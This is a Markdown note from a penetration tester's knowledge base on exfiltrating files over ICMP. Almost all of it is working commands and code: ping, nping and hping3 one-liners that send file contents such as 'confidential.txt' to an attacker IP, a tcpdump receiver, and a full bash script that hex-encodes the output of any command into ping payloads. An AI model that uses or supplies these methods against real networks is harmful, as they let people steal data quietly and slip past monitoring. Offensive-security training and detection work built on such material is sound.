# Usage

## 01 - Living off the Land

```
$ tar zcf - file.txt | xxd -p -c 16 | while read line; do ping -p $line -c 1 -q <attacker_IP>; done

$ tar zcf - file.txt | xxd -p -c 4 | while read line; do ping -p $line -c 1 -q <attacker_IP>; done
```

## 02 - Nping

```
$ nping --icmp <attacker_IP> --data-string "file.txt" -c 1
```

## 03 - Hping3

### 3.1 - Sending to Hping3

```
# hping3 -I <interface> -9 <IP> -e MYSIG > confidential.txt
```

The sender

```
# hping3 <attacker_IP> --icmp --sign MSGID1 -d 50 -c 1 --file confidential.txt
```

### 3.2 - Sending to `tcpdump`

We will need a maximum payload size of `1500`.

```
# ip address show eth0 | grep mtu
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
```

Send the file to the attacker's server.

```
# hping3 -1 -E file.txt -u -d 1500 <attacker_IP>
```

Receive the incoming pings with the file.

```
# tcpdump -i eth0 -nX
```

## 04 - Bash Script

```bash
#!/bin/bash

echo "${@:2}"

if [[ -z "$1" ]] || [[ -z "$2" ]];
then
    echo "Usage: $0 <destination> <command>"
    exit 1
fi

DEST=$1
CMD=${@:2}
OUTPUT=$($CMD | xxd -p -c 16)

ORG=$IFS
IFS=$(echo -en "\n\b")

for ROW in ${OUTPUT[@]}
do
    if [[ ${#ROW} = 32 ]]; then
        PAYLOAD=$ROW
    else
        PAD=$(printf "%0$(expr 32 - ${#ROW})d" 0)
        PAYLOAD=$ROW$PAD
    fi
    ping -c 1 -p $PAYLOAD $DEST
done
```

Usage

```
$ chmod +x icmp.sh

$ ./icmp.sh <attacker_IP> file.txt
```

---
## References

### Backlinks

- [[TCPDump]]

- [[07 - Tactics & Techniques & Procedures (TTPs) Phases/F - Post Exploitation/0x05 - File Transfer and Data Exfiltration/Linux/Network Protocols/ICMP/Server]]

### Dale Hobbs

- [Dale Hobbs: Data Exfiltration with Hping3](https://www.phoenixinfosec.com/post/data-exfiltration-with-hping3)